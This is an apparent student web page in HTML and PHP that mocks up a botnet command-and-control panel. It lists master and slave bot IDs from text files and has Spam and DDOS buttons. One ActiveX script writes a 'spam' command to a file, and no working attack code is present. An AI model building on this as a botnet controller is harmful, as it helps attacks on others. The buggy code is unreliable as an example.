<body background="123.jpg">
	

</body>

<head>
		<title>CS Project</title>
		<script>
		setTimeout(function(){window.location=window.location;},5000);
		</script>
</head>
	


<!--<img align=left src="hello.gif"  width=290 height=80></p></p>-->
<table style="width:100%">
	<tr><th><font size="9"><FONT COLOR="#FFFFFF"><font face="fantasy">~~~~~Master~~~~~</th></tr>
</table>

<!-- define table -->
<table align="center" style="width:80%;height:40px;border:5px #D68B00 dashed;background-color:#D68B00;" bordercolor=FF9D37 rules="all" cellpadding='5'>
	
	<tr>
		<th><font size="5">ID</th>
	</tr>
	
	
	<?php
		$file=fopen("../project/master.txt","r");
			while(!feof($file)){	
				$line  = fgets($file);
				$cols=explode(",",$line);
				for($i=0;$i<count($cols);$i++){
					echo"<tr  bgColor=\"#FFD78C\">";
					echo "<th>";
					echo $cols[$i];
					echo "</th bgColor=\"#FFD78C\">";
					echo"</tr>";
				}
				
			}
	?>
		
	
			
			
	
</table></p></p>

<table style="width:100%" cellpadding=0 cellspacing=0>
	<tr>
		<th>
		
		    	<button type="submit" style="width:120px;height:40px;border:2px  outset;background-color:#00FF00;"><b><font face=\"cursive\" size=3 COLOR=#0000a0>Spam</button></p>
	
		</th>
		<th>
	
				<button type="submit" style="width:120px;height:40px;border:2px  outset;background-color:#00FF00;"><b><font face=\"cursive\" size=3 COLOR=#0000a0>DDOS</button></p>

		</th>
			
	</tr>
</table>

<table style="width:100%">
	<tr><th><font size="9"><FONT COLOR="#FFFFFF"><font face="fantasy">~~~~~Slave~~~~~</th></tr>
</table>

<!-- define table -->
<table align="center" style="width:80%;height:40px;border:5px #D68B00 dashed;background-color:#D68B00;" bordercolor=FF9D37 rules="all" cellpadding='5'>
	
	<tr>
		<th><font size="5">ID</th>
	</tr>
	<!--
	<tr>
		<th bgColor="#FFD78C"></th>
	</tr>
	<tr>
		<th bgColor="#FFD78C"></th>
	</tr>
	<tr>
		<th bgColor="#FFD78C"></th>
	</tr>
	<tr>
		<th bgColor="#FFD78C"></th>
	</tr>
	<tr>
		<th bgColor="#FFD78C"></th>
	</tr>-->
	 <?php
				$file=fopen("../project/slave.txt","r");
				 while(!feof($file)){	
					$line  = fgets($file);
					$cols=explode(",",$line);
					for($i=0;$i<count($cols)-1;$i++){
						echo"<tr  bgColor=\"#FFD78C\">";
						echo "<th>";
							echo $cols[$i];
						echo "</th bgColor=\"#FFD78C\">";
						echo"</tr>";
						}
				
				}
			 ?>
			
			
	
</table></p></p>

<table style="width:100%" cellpadding=0 cellspacing=0>
	<tr>
		<th>
			<script language="javascript">
					function spam() {
　						document.write('slave does spam.');
						var command = "spam"
						var temp ='';
						var fso  = new ActiveXObject("Scripting.FileSystemObject");
						var folder ='public_html:\\spam'+temp+'.txt';
						var fh = fso.CreateTextFile(folder,true);
						fh.WriteLine(command);
						fh.Close();
					}
					</script>
					
						
					
					<button onclick="spam()" style="width:120px;height:40px;border:2px  outset;background-color:#00FF00;"><b><font face=\"cursive\" size=3 COLOR=#0000a0>spam</button>
		    	
				
				<!--<button type="submit" style="width:120px;height:40px;border:2px  outset;background-color:#00FF00;"><b><font face=\"cursive\" size=3 COLOR=#0000a0>Spam</button></p>-->

		</th>
		<th>
			
				<button type="submit" style="width:120px;height:40px;border:2px  outset;background-color:#00FF00;"><b><font face=\"cursive\" size=3 COLOR=#0000a0>DDOS</button></p>
		
		</th>
			
	</tr>
</table>

<!-- http://people.cs.nctu.edu.tw/~leemeh88/amy.php-->

<form>
<font size="6"><font face="fantasy">Command：<input type="text" name="string"  > 
<?php
  $myfile = fopen("output.txt","w");
  echo fprintf($myfile,"Welcome to %s.",$string);
?>


</form>
